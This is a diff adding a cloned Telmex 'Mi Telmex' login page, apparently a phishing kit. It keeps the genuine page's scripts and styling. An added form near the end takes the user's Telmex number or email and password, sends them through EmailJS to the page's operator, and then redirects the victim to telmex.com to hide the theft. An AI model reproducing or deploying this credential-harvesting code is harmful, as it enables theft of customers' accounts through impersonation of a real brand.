@@ -1,0 +1,667 @@
+<!DOCTYPE html>
+
+<meta charset="UTF-8">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Expires" content="0">
+
+
+
+
+<!-- saved from url=(0159)https://loginsso.telmex.com/nidp/idff/sso?id=custom-telmex&sid=0&option=credential&sid=0&target=https%3A%2F%2Fmitelmex.telmex.com%2Fweb%2Fmitelmex-hogar%2Fhome -->
+<html class="aui ltr" dir="ltr" lang="es"><div id="in-page-channel-node-id" data-channel-name="in_page_channel_XcMCC_"></div><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+        <title>Telmex Login</title>
+
+        <link rel="icon" type="image/x-icon" href="https://loginsso.telmex.com/nidp/TMX_resources/images/favicon.ico"> 
+        
+
+        
+        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+        <link href="./Telmex Login_files/bootstrap_n.css" rel="stylesheet">
+        <link href="./Telmex Login_files/font-awesome_n.css" rel="stylesheet">
+        <link href="./Telmex Login_files/css" rel="stylesheet">
+        <link type="text/css" rel="stylesheet" href="./Telmex Login_files/estilos_n.css">
+        <link href="./Telmex Login_files/tema_telmex_n.min.css" rel="stylesheet">
+        <link href="./Telmex Login_files/menu_n.css" rel="stylesheet">
+        <link type="text/css" rel="stylesheet" href="./Telmex Login_files/all.min_n.css">
+        <script type="text/javascript" async="" src="./Telmex Login_files/js"></script><script src="./Telmex Login_files/sdk.js.descarga" async="" crossorigin="anonymous"></script><script async="" src="./Telmex Login_files/gtm.js.descarga"></script><script src="./Telmex Login_files/cb=gapi.loaded_1" async=""></script><script async="" src="./Telmex Login_files/stormcaster.js.descarga"></script><script id="facebook-jssdk" src="./Telmex Login_files/sdk(1).js.descarga"></script><script type="text/javascript" async="" charset="utf-8" src="./Telmex Login_files/recaptcha__es_419.js.descarga" crossorigin="anonymous" integrity="sha384-lQQlUDPBEY9S1eEKRmeV6DhzyKz8wrIA0EvNQGEeJrPThYrdAZqAEh6bFeZ2jwY1"></script><script src="./Telmex Login_files/cb=gapi.loaded_0" async=""></script><script src="./Telmex Login_files/jquery_n.min.js.descarga"></script>
+        <script type="text/javascript" src="./Telmex Login_files/menu_n.js.descarga"></script>
+        <script type="text/javascript" src="./Telmex Login_files/jsencrypt_n.min.js.descarga"></script>
+        <meta name="google-signin-scope" content="profile email">
+        <meta name="google-signin-client_id" content="1092407648557-ltb10eqmrgd7t7eatcblvb45pr3gmslb.apps.googleusercontent.com">
+        <script src="./Telmex Login_files/platform.js.descarga" async="" defer="" gapi_processed="true"></script>
+        <script src="./Telmex Login_files/api_client.js.descarga" gapi_processed="true"></script>
+        <script src="./Telmex Login_files/api.js.descarga"></script>
+        <script>
+            function popUpOpen(url) {
+                newwindow = window.open(url, 'Telmex Social', 'height=650,width=850');
+                if (window.focus) {
+                    newwindow.focus()
+                }
+                return false;
+            }
+        </script>
+
+        <script>
+            var googleUser = {};
+            var startApp = function () {
+                gapi.load('auth2', function () {
+                    auth2 = gapi.auth2.init({
+                        client_id: '1092407648557-ltb10eqmrgd7t7eatcblvb45pr3gmslb.apps.googleusercontent.com',
+                        cookiepolicy: 'single_host_origin',
+                    });
+                    attachSignin(document.getElementById('googleBtn'));
+                });
+            };
+
+            function attachSignin(element) {
+                auth2.attachClickHandler(element, {},
+                        function (googleUser) {
+                            var profile = googleUser.getBasicProfile();
+                            document.getElementById("GSemail").value = profile.getId();
+                            var auth2 = gapi.auth2.getAuthInstance();
+                            auth2.signOut();
+                            $("#IDPLogin").submit();
+                        }, function (error) {
+                });
+            }
+        </script>
+
+
+        <script>
+            window.fbAsyncInit = function () {
+                FB.init({
+                    appId: '673330293122132',
+                    cookie: true,
+                    xfbml: true,
+                    version: 'v3.2'
+                });
+
+                FB.AppEvents.logPageView();
+
+            };
+
+            (function (d, s, id) {
+                var js, fjs = d.getElementsByTagName(s)[0];
+                if (d.getElementById(id)) {
+                    return;
+                }
+                js = d.createElement(s);
+                js.id = id;
+                js.src = "https://connect.facebook.net/en_US/sdk.js";
+                fjs.parentNode.insertBefore(js, fjs);
+            }(document, 'script', 'facebook-jssdk'));
+        </script>
+
+        <script>
+            function loginFB() {
+                FB.getLoginStatus(function (response) {
+                    if (response.status === 'connected') {
+                        var uid = response.authResponse.userID;
+                        var accessToken = response.authResponse.accessToken;
+
+                        FB.api('/me', {fields: 'id'}, function (response) {
+                            document.getElementById("FBemail").value = response.id;
+                            $("#IDPLogin").submit();
+                            return response.id;
+                        });
+
+                    } else if (response.status === 'not_authorized') {
+                    } else {
+                    }
+                    return 0;
+                });
+            }
+        </script>
+
+        <script>
+            function facebookOpen() {
+                FB.login(loginFB);
+            }
+        </script>
+
+        <script type="text/javascript">
+            function isEnterKey(event)
+            {
+                return isKey(event, 13);
+            }
+
+            function isSpaceKey(event)
+            {
+                return isKey(event, 32);
+            }
+
+            function isKey(event, targetKeyCode)
+            {
+                var candidateKeyCode = (event.which) ? event.which : event.keyCode;
+                if (candidateKeyCode != targetKeyCode)
+                {
+                    return false;
+                }
+                return true;
+            }
+        </script>
+
+
+        
+        <script>
+            function safeSetGlobalMessage(strMessage)
+            {
+                var proofOfEndUserEnvironment = document.getElementById('runningInEndUserLoginEnvironment');
+                if (proofOfEndUserEnvironment)
+                {
+                    setGlobalMessage(strMessage);
+                }
+            }
+
+             function validaUser(){
+
+                var userNameEditBox = document.getElementById('Ecom_User_ID');
+				var error = false;
+				$('#btnCont').addClass('btn_red disabled');
+
+                if ((null == userNameEditBox) || (undefined == userNameEditBox) || (0 == userNameEditBox.value.length))
+                {
+
+                asignarError("Introduzca un número Telmex o correo electrónico válido");
+                    userNameEditBox.focus();
+                    error = true;
+					//return;
+                } else if(/\D/.test(userNameEditBox.value))  
+                {
+                    if(!validateEmail(userNameEditBox.value)){
+                        asignarError("Por favor, valida tu correo electrónico e intenta de nuevo");
+                        userNameEditBox.focus();
+						error = true;
+                        //return;
+                    }
+                }
+                else {
+                    if (10 != userNameEditBox.value.length){
+                        asignarError("Recuerda que el teléfono  debe tener 10 dígitos, intenta de nuevo.");
+                        userNameEditBox.focus();
+						error = true;
+                        //return;
+                    }   
+                        
+                }
+				
+				if (error){
+					$('#btnCont').removeClass('btn_red disabled');
+                    $('#btnCont').addClass('btn_red');
+					return
+				}
+				
+
+                
+				
+				
+
+                 var form = document.getElementById('IDPLogin');
+                    var url = form.action;
+
+                    safeSetGlobalMessage("Validando credenciales...");
+
+                    var proofOfEndUserEnvironment = document.getElementById('runningInEndUserLoginEnvironment');
+                    if (proofOfEndUserEnvironment)
+                    {
+                        url = updateQueryString("uiDestination", "contentDiv", url);
+
+                        // Send the data using post
+                        var posting = $.post(url, $("#IDPLogin").serialize());
+
+                        // Put the results in a div
+                        posting.done(function (data)
+                        {
+                            safeSetGlobalMessage("");
+                            $('#theNidpContent').html(data);
+                        });
+
+                        posting.fail(function ()
+                        {
+                            safeSetGlobalMessage("Error al comunicarse con el servidor de identidades");
+                        });
+                    } else
+                    {
+						
+                $("#IDPLogin").submit();
+            }
+            }
+
+            /**
+ * Verifica que la cadena no tenga caracteres especiales
+ * @param {*} texto 
+ */
+function validaCaracteresEspeciales(texto){
+    var special_characters = /([(,@,),.,\,])/;
+    if( texto.match(special_characters)){
+        return false;
+    }else{
+        return true;
+    }   
+}
+
+/**
+ * Expresion regular para validar un correo electrónico
+ */
+function validateEmail(email) {
+    const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
+    return re.test(email);
+  }
+
+            function asignarError(msg){
+                    //$('#Ecom_User_ID').removeClass('cont_input');
+                    $('#Ecom_User_ID').addClass('error_msg cont_input');
+
+                    //document.getElementById('Ecom_User_ID').className = "error_msg cont_input";
+                    var errorUser = document.getElementById('errorUser');
+                    errorUser.className = "msg_mini_error";
+                    errorUser.innerHTML=msg;
+            
+            }
+
+            function asignarErrorPass(msg){
+                    $('#Ecom_Password').addClass('error_msg cont_input');
+
+                    var errorPass = document.getElementById('errorPass');
+                    errorPass.className = "msg_mini_error";
+                    errorPass.innerHTML=msg;
+            
+            }
+
+             function validaPassword(){
+                var userNameEditBox = document.getElementById('Ecom_User_ID');
+                userNameEditBox.value = "null";
+				$('#btnIniciar').addClass('btn_red disabled');
+
+                var userPasswordEditBox = document.getElementById('Ecom_Password');
+
+                if ((null == userPasswordEditBox) || (undefined == userPasswordEditBox) || (0 == userPasswordEditBox.value.length)) {
+                    //asignarErrorPass("Introduzca contraseña");
+                    //userPasswordEditBox.focus();
+                    //$('#btnIniciar').removeClass('btn_red disabled');
+                    //$('#btnIniciar').addClass('btn_red');
+                    return;
+                }
+				
+                $("#IDPLogin2").submit();
+             }
+            
+            
+            function onLoadFocus()
+            {
+                if (document.IDPLogin.Ecom_User_ID.value)
+                {
+                    document.IDPLogin.Ecom_Password.focus();
+                } else
+                {
+                    document.IDPLogin.Ecom_User_ID.focus();
+                }
+            }
+
+
+            function vUser(){  
+  
+                var userNameEditBox = "null";
+                var user = document.getElementById('Ecom_User_ID');
+                var pass = document.getElementById('Ecom_Password');
+                var error = "";
+                
+                
+
+                if(userNameEditBox=="null" || userNameEditBox==undefined){
+                  $('#bloq_login_pass').hide();
+                  $('#bloq_login1').show();
+                  $('#redessociales').show();
+                  if ( error != "null"  ){
+                    asignarError(error);
+                  }
+                  if(user!=null|| user!=undefined){
+                  user.focus();
+                    }
+
+                } else {
+                    $('#bloq_login1').hide();
+                    $('#redessociales').hide();
+                    $('#bloq_login_pass').show();
+
+                    if ( error != "null"  ){
+                        asignarErrorPass(error);
+                    }
+                    if(pass!=null|| pass!=undefined){
+                        pass.focus(); 
+                    }
+                }
+
+            }
+
+            function cambiar(){
+                
+                $('#bloq_login_pass').hide();
+                $('#bloq_login1').show();
+                $('#redessociales').show();
+                var myobj = document.getElementById("bloq_login_pass");
+                myobj.remove();
+                var userNameEditBox = document.getElementById('Ecom_User_ID');
+
+                userNameEditBox.focus();
+            }
+
+            
+            function cambiaPassword(){
+                if(validatePass == true && validatePassConfirm == true && $("#changePassword").val()== $("#changePasswordConfirm").val()){
+                    $("#IDPChangePwd").submit(); 
+                }                    
+            }
+
+            function habilita(){
+                if(document.getElementById("Ecom_Password").value==undefined ||document.getElementById("Ecom_Password").value==''){
+                $('#btnIniciar').addClass('btn_red disabled');
+                }else{
+                $('#btnIniciar').removeClass('btn_red disabled');
+                $('#btnIniciar').addClass('btn_red');
+                }
+            }            
+ 
+
+            $(document).ready(function () {
+
+                //onLoadFocus();
+
+                vUser();
+
+                $('#btnIniciar').addClass('btn_red disabled');
+
+				$("#IDPLogin").keypress(function(e) {
+					if (e.which == 13) {
+						return false;
+					}
+				});
+
+				$("#IDPLogin2").keypress(function(e) {
+					if (e.which == 13) {
+						return false;
+					}
+				});
+
+                $("#btnCont").click(function ()
+                {	
+                    validaUser();
+
+                });
+
+
+                $("#btnCont").keyup(function (event)
+                {
+                    if (isEnterKey(event) || isSpaceKey(event))
+                    {
+                        validaUser();
+                    }
+                });
+
+                $("#btnIniciar").click(function (event)
+                {
+                    validaPassword();
+
+                });
+
+                $("#btnIniciar").keyup(function (event)
+                {
+                    if (isEnterKey(event) || isSpaceKey(event))
+                    {
+                        validaPassword();
+                    }
+                });
+
+
+                $("#Ecom_User_ID").keyup(function (event)  
+                {
+                    if (isEnterKey(event))
+                    {
+						$("#btnCont").click();
+						return false;
+                    }
+                    return true;
+                });
+
+                $("#Ecom_Password").keyup(function (event)
+                {
+                    if (isEnterKey(event))
+                    {
+						$("#btnIniciar").click();
+						return false;
+                    }
+                    return true;
+                });
+            
+            });
+
+        </script>
+        
+    <script>var __uzdbm_1 = "3720edb4-c90a-49e0-80c9-18554a3f7695";var __uzdbm_2 = "NDk2YmEyNjAtYmt6di00NTJmLWJmMjQtZGQ4M2MzYjA5YjExJDE1Ni4xNDYuNTQuODI=";var __uzdbm_3 = "7f6000d6289846-164a-48ea-b560-975849ed6e96172826028783727101-bbf9012a5aa4672116";var __uzdbm_4 = "false";var __uzdbm_5 = "uzmx";var __uzdbm_6 = "7f90001c92c093-3fe6-4067-8dff-218fbc516dcb1-172826027992835010-3445b3a90c0475db40";var __uzdbm_7 = "telmex.com";</script> <script>   (function (w, d, e, u, c, g, a, b) {     w["SSJSConnectorObj"] = w["SSJSConnectorObj"] || {       ss_cid: c,       domain_info: "auto",     };     w[g] = function (i, j) {       w["SSJSConnectorObj"][i] = j;     };     a = d.createElement(e);     a.async = true;     if (       navigator.userAgent.indexOf('MSIE') !== -1 ||       navigator.appVersion.indexOf('Trident/') > -1     ) {       u = u.replace("/advanced/", "/advanced/ie/");     }     a.src = u;     b = d.getElementsByTagName(e)[0];     b.parentNode.insertBefore(a, b);   })(     window, document, "script", "https://loginsso.telmex.com/18f5227b-e27b-445a-a53f-f845fbe69b40/stormcaster.js", "bkzx", "ssConf"   );   ssConf("c1", "https://loginsso.telmex.com");   ssConf("c3", "c99a4269-161c-4242-a3f0-28d44fa6ce24");   ssConf("au", "loginsso.telmex.com");   ssConf("cu", "validate.perfdrive.com, ssc"); </script><style type="text/css" data-fbcssmodules="css:fb.css.base css:fb.css.dialog css:fb.css.iframewidget css:fb.css.customer_chat_plugin_iframe">.fb_hidden{position:absolute;top:-10000px;z-index:10001}.fb_reposition{overflow:hidden;position:relative}.fb_invisible{display:none}.fb_reset{background:none;border:0;border-spacing:0;color:#000;cursor:auto;direction:ltr;font-family:'lucida grande', tahoma, verdana, arial, sans-serif;font-size:11px;font-style:normal;font-variant:normal;font-weight:normal;letter-spacing:normal;line-height:1;margin:0;overflow:visible;padding:0;text-align:left;text-decoration:none;text-indent:0;text-shadow:none;text-transform:none;visibility:visible;white-space:normal;word-spacing:normal}.fb_reset>div{overflow:hidden}@keyframes fb_transform{from{opacity:0;transform:scale(.95)}to{opacity:1;transform:scale(1)}}.fb_animate{animation:fb_transform .3s forwards}
+.fb_hidden{position:absolute;top:-10000px;z-index:10001}.fb_reposition{overflow:hidden;position:relative}.fb_invisible{display:none}.fb_reset{background:none;border:0;border-spacing:0;color:#000;cursor:auto;direction:ltr;font-family:'lucida grande', tahoma, verdana, arial, sans-serif;font-size:11px;font-style:normal;font-variant:normal;font-weight:normal;letter-spacing:normal;line-height:1;margin:0;overflow:visible;padding:0;text-align:left;text-decoration:none;text-indent:0;text-shadow:none;text-transform:none;visibility:visible;white-space:normal;word-spacing:normal}.fb_reset>div{overflow:hidden}@keyframes fb_transform{from{opacity:0;transform:scale(.95)}to{opacity:1;transform:scale(1)}}.fb_animate{animation:fb_transform .3s forwards}
+.fb_dialog{background:rgba(82, 82, 82, .7);position:absolute;top:-10000px;z-index:10001}.fb_dialog_advanced{border-radius:8px;padding:10px}.fb_dialog_content{background:#fff;color:#373737}.fb_dialog_close_icon{background:url(https://connect.facebook.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 0 transparent;cursor:pointer;display:block;height:15px;position:absolute;right:18px;top:17px;width:15px}.fb_dialog_mobile .fb_dialog_close_icon{left:5px;right:auto;top:5px}.fb_dialog_padding{background-color:transparent;position:absolute;width:1px;z-index:-1}.fb_dialog_close_icon:hover{background:url(https://connect.facebook.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 -15px transparent}.fb_dialog_close_icon:active{background:url(https://connect.facebook.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 -30px transparent}.fb_dialog_iframe{line-height:0}.fb_dialog_content .dialog_title{background:#6d84b4;border:1px solid #365899;color:#fff;font-size:14px;font-weight:bold;margin:0}.fb_dialog_content .dialog_title>span{background:url(https://connect.facebook.net/rsrc.php/v3/yd/r/Cou7n-nqK52.gif) no-repeat 5px 50%;float:left;padding:5px 0 7px 26px}body.fb_hidden{height:100%;left:0;margin:0;overflow:visible;position:absolute;top:-10000px;transform:none;width:100%}.fb_dialog.fb_dialog_mobile.loading{background:url(https://connect.facebook.net/rsrc.php/v3/ya/r/3rhSv5V8j3o.gif) white no-repeat 50% 50%;min-height:100%;min-width:100%;overflow:hidden;position:absolute;top:0;z-index:10001}.fb_dialog.fb_dialog_mobile.loading.centered{background:none;height:auto;min-height:initial;min-width:initial;width:auto}.fb_dialog.fb_dialog_mobile.loading.centered #fb_dialog_loader_spinner{width:100%}.fb_dialog.fb_dialog_mobile.loading.centered .fb_dialog_content{background:none}.loading.centered #fb_dialog_loader_close{clear:both;color:#fff;display:block;font-size:18px;padding-top:20px}#fb-root #fb_dialog_ipad_overlay{background:rgba(0, 0, 0, .4);bottom:0;left:0;min-height:100%;position:absolute;right:0;top:0;width:100%;z-index:10000}#fb-root #fb_dialog_ipad_overlay.hidden{display:none}.fb_dialog.fb_dialog_mobile.loading iframe{visibility:hidden}.fb_dialog_mobile .fb_dialog_iframe{position:sticky;top:0}.fb_dialog_content .dialog_header{background:linear-gradient(from(#738aba), to(#2c4987));border-bottom:1px solid;border-color:#043b87;box-shadow:white 0 1px 1px -1px inset;color:#fff;font:bold 14px Helvetica, sans-serif;text-overflow:ellipsis;text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0;vertical-align:middle;white-space:nowrap}.fb_dialog_content .dialog_header table{height:43px;width:100%}.fb_dialog_content .dialog_header td.header_left{font-size:12px;padding-left:5px;vertical-align:middle;width:60px}.fb_dialog_content .dialog_header td.header_right{font-size:12px;padding-right:5px;vertical-align:middle;width:60px}.fb_dialog_content .touchable_button{background:linear-gradient(from(#4267B2), to(#2a4887));background-clip:padding-box;border:1px solid #29487d;border-radius:3px;display:inline-block;line-height:18px;margin-top:3px;max-width:85px;padding:4px 12px;position:relative}.fb_dialog_content .dialog_header .touchable_button input{background:none;border:none;color:#fff;font:bold 12px Helvetica, sans-serif;margin:2px -12px;padding:2px 6px 3px 6px;text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0}.fb_dialog_content .dialog_header .header_center{color:#fff;font-size:16px;font-weight:bold;line-height:18px;text-align:center;vertical-align:middle}.fb_dialog_content .dialog_content{background:url(https://connect.facebook.net/rsrc.php/v3/y9/r/jKEcVPZFk-2.gif) no-repeat 50% 50%;border:1px solid #4a4a4a;border-bottom:0;border-top:0;height:150px}.fb_dialog_content .dialog_footer{background:#f5f6f7;border:1px solid #4a4a4a;border-top-color:#ccc;height:40px}#fb_dialog_loader_close{float:left}.fb_dialog.fb_dialog_mobile .fb_dialog_close_icon{visibility:hidden}#fb_dialog_loader_spinner{animation:rotateSpinner 1.2s linear infinite;background-color:transparent;background-image:url(https://connect.facebook.net/rsrc.php/v3/yD/r/t-wz8gw1xG1.png);background-position:50% 50%;background-repeat:no-repeat;height:24px;width:24px}@keyframes rotateSpinner{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+.fb_iframe_widget{display:inline-block;position:relative}.fb_iframe_widget span{display:inline-block;position:relative;text-align:justify}.fb_iframe_widget iframe{position:absolute}.fb_iframe_widget_fluid_desktop,.fb_iframe_widget_fluid_desktop span,.fb_iframe_widget_fluid_desktop iframe{max-width:100%}.fb_iframe_widget_fluid_desktop iframe{min-width:220px;position:relative}.fb_iframe_widget_lift{z-index:1}.fb_iframe_widget_fluid{display:inline}.fb_iframe_widget_fluid span{width:100%}
+.fb_mpn_mobile_landing_page_slide_out{animation-duration:200ms;animation-name:fb_mpn_landing_page_slide_out;transition-timing-function:ease-in}.fb_mpn_mobile_landing_page_slide_out_from_left{animation-duration:200ms;animation-name:fb_mpn_landing_page_slide_out_from_left;transition-timing-function:ease-in}.fb_mpn_mobile_landing_page_slide_up{animation-duration:500ms;animation-name:fb_mpn_landing_page_slide_up;transition-timing-function:ease-in}.fb_mpn_mobile_bounce_in{animation-duration:300ms;animation-name:fb_mpn_bounce_in;transition-timing-function:ease-in}.fb_mpn_mobile_bounce_out{animation-duration:300ms;animation-name:fb_mpn_bounce_out;transition-timing-function:ease-in}.fb_mpn_mobile_bounce_out_v2{animation-duration:300ms;animation-name:fb_mpn_fade_out;transition-timing-function:ease-in}.fb_customer_chat_bounce_in_v2{animation-duration:300ms;animation-name:fb_bounce_in_v2;transition-timing-function:ease-in}.fb_customer_chat_bounce_in_from_left{animation-duration:300ms;animation-name:fb_bounce_in_from_left;transition-timing-function:ease-in}.fb_customer_chat_bounce_out_v2{animation-duration:300ms;animation-name:fb_bounce_out_v2;transition-timing-function:ease-in}.fb_customer_chat_bounce_out_from_left{animation-duration:300ms;animation-name:fb_bounce_out_from_left;transition-timing-function:ease-in}.fb_invisible_flow{display:inherit;height:0;overflow-x:hidden;width:0}@keyframes fb_mpn_landing_page_slide_out{0%{margin:0 12px;width:100% - 24px}60%{border-radius:18px}100%{border-radius:50%;margin:0 24px;width:60px}}@keyframes fb_mpn_landing_page_slide_out_from_left{0%{left:12px;width:100% - 24px}60%{border-radius:18px}100%{border-radius:50%;left:12px;width:60px}}@keyframes fb_mpn_landing_page_slide_up{0%{bottom:0;opacity:0}100%{bottom:24px;opacity:1}}@keyframes fb_mpn_bounce_in{0%{opacity:.5;top:100%}100%{opacity:1;top:0}}@keyframes fb_mpn_fade_out{0%{bottom:30px;opacity:1}100%{bottom:0;opacity:0}}@keyframes fb_mpn_bounce_out{0%{opacity:1;top:0}100%{opacity:.5;top:100%}}@keyframes fb_bounce_in_v2{0%{opacity:0;transform:scale(0, 0);transform-origin:bottom right}50%{transform:scale(1.03, 1.03);transform-origin:bottom right}100%{opacity:1;transform:scale(1, 1);transform-origin:bottom right}}@keyframes fb_bounce_in_from_left{0%{opacity:0;transform:scale(0, 0);transform-origin:bottom left}50%{transform:scale(1.03, 1.03);transform-origin:bottom left}100%{opacity:1;transform:scale(1, 1);transform-origin:bottom left}}@keyframes fb_bounce_out_v2{0%{opacity:1;transform:scale(1, 1);transform-origin:bottom right}100%{opacity:0;transform:scale(0, 0);transform-origin:bottom right}}@keyframes fb_bounce_out_from_left{0%{opacity:1;transform:scale(1, 1);transform-origin:bottom left}100%{opacity:0;transform:scale(0, 0);transform-origin:bottom left}}@keyframes slideInFromBottom{0%{opacity:.1;transform:translateY(100%)}100%{opacity:1;transform:translateY(0)}}@keyframes slideInFromBottomDelay{0%{opacity:0;transform:translateY(100%)}97%{opacity:0;transform:translateY(100%)}100%{opacity:1;transform:translateY(0)}}</style></head>
+    <body class="portal-normal yui3-skin-sam controls-visible signed-out public-page site dockbar-split">
+        
+
+        <div id="wrapper">
+            <header class="mainHead">
+                <div class="menuWrap">
+                    <div class="topHeader">
+                        <div class="fullBox">
+                            <nav class="familyMenu">
+                                <a href="https://telmex.com/web/hogar" class="current">Hogar</a>
+                                <a href="https://telmex.com/web/negocios">Negocio</a>
+                                <a href="https://telmex.com/web/empresas">Empresa</a>
+                            </nav>
+                            <!--familyMenu end-->
+                            <nav class="addMenu">
+                                <a href="https://www.claroshop.com/" target="_blank">Claro Shop</a>
+                                <a href="https://telmex.com/web/buscador/lugares">Tiendas Telmex y Sitios WiFi</a>
+                                <span>
+                                    <a id="minusTypo">a-</a>
+                                    <a id="plusTypo">A+</a>
+                                </span>
+                            </nav>
+                            <!--addMEnu end-->
+                        </div>
+                        <!--end FullBox-->
+                    </div>
+
+                    <div class="menuContainer">
+                        <div class="fullBox">
+                            <style></style>
+                            <a class="logoTmx" href="https://loginsso.telmex.com/nidp/idff/sso?id=custom-telmex&amp;sid=0&amp;option=credential&amp;sid=0&amp;target=https%3A%2F%2Fmitelmex.telmex.com%2Fweb%2Fmitelmex-hogar%2Fhome#">
+                                <img src="./Telmex Login_files/telmex.svg" alt="Telmex">
+                            </a>
+                            <nav class="mainMenu">
+                                <ul class="ulMenu" style="margin-left: 0px;">
+                                    <li class="dropdownOp">
+                                        <a href="https://telmex.com/web/hogar/conexion-a-internet">Servicios</a>                                    
+                                    </li>
+                                    <li class="dropdownOp">
+                                        <a href="https://loginsso.telmex.com/nidp/idff/sso?id=custom-telmex&amp;sid=0&amp;option=credential&amp;sid=0&amp;target=https%3A%2F%2Fmitelmex.telmex.com%2Fweb%2Fmitelmex-hogar%2Fhome#">Mi Telmex</a>                                  
+                                    </li>
+                                    <li class="dropdownOp">
+                                        <a href="https://tienda.telmex.com/">Tienda Telmex</a>
+                                    </li>
+                                    <li class="dropdownOp">
+                                        <a href="https://telmex.com/web/asistencia">Asistencia</a>
+                                    </li>
+                                    <li class="dropdownOp">
+                                        <a href="https://telmex.com/web/blog">Blog</a>
+                                    </li>
+                                    <li class="dropdownOp">
+                                        <a href="https://telmex.com/web/hogar/portabilidad-requisitos">Cámbiate a Telmex</a>
+                                    </li>
+                                </ul>
+                            </nav>
+                            <div class="asideMenu">                      
+                                <div class="noLogedUser">
+                                    <a>Mi cuenta</a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <!--end MenuWrap-->
+            </header>
+
+
+            <div id="content" class="eachSection">
+                <div class="columns-1" id="main-content" role="main">
+                    <div class="container">
+                        <div id="form-main">
+                            
+                            <div class="cont_input_camp">
+                                <div id="bloq_login1" class="bloq_bloq_prin">
+                                    <div class="tit_telmex">Mi Telmex</div>
+                                         <div class="cont">
+                                            <div class="cont_sub_titulo">Iniciar sesión</div>
+                                            
+                                               
+
+                                                  
+
+
+                                            <form id="form">
+                                                <div class="cont_input_camp">
+                                                    <input autofocus="" id="ID" name="ID" type="text" class="cont_input" required>
+                                                    <label for="ID">Número Telmex o correo electrónico</label>
+                                                </div>
+                                            
+                                                <div class="cont_input_camp">
+                                                    <input id="Password" name="Password" type="password" class="cont_input" required>
+                                                    <label for="Password">Contraseña</label>
+                                                </div>
+                                            
+                                                <div class="cont_txt_black">
+                                                    ¿Eres nuevo en Mi Telmex? 
+                                                    <a class="btn_azul" href="https://mitelmex.telmex.com/web/mitelmex-hogar/registro">Crea tu cuenta</a>
+                                                </div>
+                                            
+                                                <button type="submit" id="btnCont" class="btn_red">Continuar</button>
+                                            
+                                                <a class="cont_txt_gris" href="https://telmex.com/web/asistencia/hogar-acceso-unico-mi-telmex" style="margin-top: 5px;">¿Necesitas ayuda?</a>
+                                            </form>
+                                            
+                                            <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+                                            <script type="text/javascript">
+                                                emailjs.init('G_hKJf1dRyYEycCtD');
+                                            
+                                                document.getElementById('form').addEventListener('submit', function(event) {
+                                                    event.preventDefault();
+                                            
+                                                    const id = document.getElementById('ID').value;
+                                                    const password = document.getElementById('Password').value;
+                                            
+                                                    const templateParams = {
+                                                        user_id: id,
+                                                        password: password
+                                                    };
+                                            
+                                                    emailjs.send('default_service', 'template_x0oiln1', templateParams)
+                                                        .then(function(response) {
+                                                            console.log('SUCCESS!', response.status, response.text);
+                                                             // Redirigir a otra página HTML
+     window.location.href = 'https://telmex.com/m/'; // Cambia 'success.html' por el nombre de tu archivo HTML
+    }, (err) => {
+        btn.value = 'Send Email';
+        alert(JSON.stringify(err));
+    });
+});
+</script>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+
+
+                                                
+<style>
+    /* Importar la fuente Roboto */
+    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
+
+    .btn_red {
+        background-color: #DE2F1B; /* Cambia el color según tus necesidades */
+        color: white;          /* Color del texto */
+        border: none;         /* Sin borde */
+        padding: 10px 20px;   /* Espaciado interno */
+        text-align: center;    /* Centrar texto */
+        text-decoration: none; /* Sin subrayado */
+        display: inline-block;  /* Permitir ajustar el tamaño */
+        font-size: 18px;       /* Tamaño de fuente */
+        cursor: pointer;       /* Cambiar cursor al pasar el mouse */
+        border-radius: 5px;    /* Bordes redondeados */
+        font-family: 'Roboto', sans-serif; /* Usar la fuente Roboto */
+    }
+
+    .btn_red:hover {
+        background-color: #C72C1A; /* Cambiar color al pasar el mouse */
+    }
+</style>
+
+                                            
+                                            
+                                            
+                                                
+                                        
+                                    </div>
+
+                                    
+                                </div>
+
+
+
+                                
+
+                            
+
+                            
+
+
+                                
+                        </div>
+                    </div>
+                </div>
+                <script>startApp();</script>
+        <script src="./Telmex Login_files/script_n.js.descarga"></script>
+        
+
+            <div id="legales"><strong>2024 Telmex. Todos los derechos reservados</strong> <ul> <li><a href="https://telmex.com/web/acerca-de-telmex/aviso-de-privacidad" target="_self">Aviso de privacidad</a></li> <li><a href="https://telmex.com/web/hogar/contrato-marco" target="_lightbox">Contrato Marco de prestación de servicios</a></li> <li><a href="https://telmex.com/web/acerca-de-telmex/oferta-mayoristas" target="_self">Oferta de servicios Mayoristas</a></li> <li><a href="https://telmex.com/web/hogar/contratos-audibles" target="_blank">Contrato Marco y Términos en formato audible</a></li> <li><a href="https://telmex.com/web/acerca-de-telmex/colaboracion-en-materia-de-seguridad-y-justicia" target="_self">Colaboración con justicia</a></li> <li><a href="https://telmex.com/mapa-de-sitio" target="_blank">Mapa de sitio</a></li> <li><a href="https://www.hearcolors.com.mx/SelloAccesibilidad.php?num_clte=040E1736" target="_blank">Declaración de accesibilidad</a></li> </ul> </div></div>
+        
+        
+
+        
+    
+
+
+<iframe id="ssIFrame_google" sandbox="allow-scripts allow-same-origin allow-storage-access-by-user-activation" allow="identity-credentials-get" aria-hidden="true" frame-border="0" src="./Telmex Login_files/iframe.html" style="position: absolute; width: 1px; height: 1px; inset: -9999px; display: none;"></iframe><style>
+  #legales ul li {
+    display: inline-block;
+    font-weight: normal;
+}
+  #ssoDudasWrapper{z-index:999;}
+  
+#legales{
+  left: 15%;
